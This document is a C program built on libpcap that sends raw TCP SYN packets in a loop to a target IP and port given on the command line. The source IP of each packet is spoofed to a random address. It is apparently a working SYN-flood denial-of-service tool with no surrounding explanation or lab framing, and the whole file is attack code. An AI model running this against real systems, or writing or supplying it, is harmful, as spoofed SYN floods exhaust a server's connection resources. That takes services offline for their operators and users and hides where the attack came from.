#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#ifndef __linux__ /* for windows */
	#include <winsock2.h>
	#include <windows.h>
#else	/* for linux */
	#include <unistd.h>
	#include <netinet/in.h>
	#include <arpa/inet.h>
	#include <pthread.h>
#endif

#include "pcap.h"
#include "tcplib.h"

enum {
	ARGV_CMD, 
	ARGV_SOURCE_MAC,
	ARGV_DEST_MAC,
	ARGV_TARGET_IP,
	ARGV_PORT,
	ARGV_COUNT
};

int main(int argc, char **argv)
{
	int count, port, no, i = 0;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct in_addr ip;
	
	pcap_t *adhandle;
	pcap_if_t *alldevs, *d;

	struct tcp_packet packet;

	if(argc != 6) {
		printf(
			"Usage : %s [source mac] [destination mac] "\
			"[target IP] [port] [count]\n", 
			argv[0]);
		return 1;
	}

	if(pcap_findalldevs(&alldevs, errbuf) < 0) {
		printf("pcap_findalldevs error\n");
		return 1;
	}

	for(d=alldevs; d; d=d->next) {
		printf("%d :  %s\n",++i, (d->description)?(d->description):(d->name));
	}

	printf("number : ");	
	scanf("%d", &no);

	if(!(no > 0 && no <= i)) {
		printf("number error\n");
		return 1;
	}

	for(d=alldevs, i=0; d; d=d->next) {
		if(no == ++i)  break;
	}

	if(!(adhandle= pcap_open_live(d->name, 65536, 1,	1000, errbuf))) {
		printf("pcap_open_live error %s\n", d->name);
		pcap_freealldevs(alldevs);
		return 1;
	}

	memset(&packet, 0x00, sizeof(packet));

	strmac_to_buffer(
		argv[ARGV_DEST_MAC], packet.ether_header.ether_dhost);
	strmac_to_buffer(
		argv[ARGV_SOURCE_MAC], packet.ether_header.ether_shost);
	packet.ether_header.ether_type = htons(ETHERTYPE_IP);

	port = atoi(argv[ARGV_PORT]);
	count = atoi(argv[ARGV_COUNT]);	

	for(i=0; i<=count; i++) {

		ip.s_addr = rand();

		make_tcp_header(
				&packet, 
				inet_ntoa(ip), rand(), 
				argv[ARGV_TARGET_IP], port, rand(), 0, TH_SYN);

		make_ip_header(&(packet.ip), 
				inet_ntoa(ip), argv[ARGV_TARGET_IP], sizeof(struct tcphdr));

		pcap_sendpacket(
			adhandle, (unsigned char *)&packet, sizeof(packet)
		);
	}

	pcap_freealldevs(alldevs);
	pcap_close(adhandle);

	return 0;
}
